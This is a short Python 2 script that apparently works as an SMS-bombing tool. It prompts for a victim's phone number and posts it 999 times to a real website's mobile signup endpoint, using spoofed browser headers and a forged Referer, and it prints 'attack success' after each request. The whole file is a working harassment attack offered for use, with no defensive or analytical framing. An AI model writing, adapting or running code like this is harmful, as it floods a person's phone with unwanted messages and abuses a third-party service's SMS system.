#coding:utf-8
import httplib, urllib, sys, os, re, urllib2
import string


def attack(phone,number):
    datas = ""

    url = 'http://topic.hongxiu.com/wap/indexaction.aspx'
    # 请求的数据
    payload = {'hidtpye': '2',
               'txtMobile': phone}
    # 注意Referer不能为空
    i_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36",
                 "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", 'Referer': 'http://topic.hongxiu.com/wap/index.htm'}
    payload = urllib.urlencode(payload)

    for x in range(0,999):
        try:
            request = urllib2.Request(url, payload, i_headers)
            response = urllib2.urlopen(request)
            datas = response.read()
            print datas
            print 'attack success!!!'
        except Exception, e:
            print e
            print "attack failed!!!"


if __name__ == "__main__":
    phone = raw_input('input the phone:')
    attack(phone,999)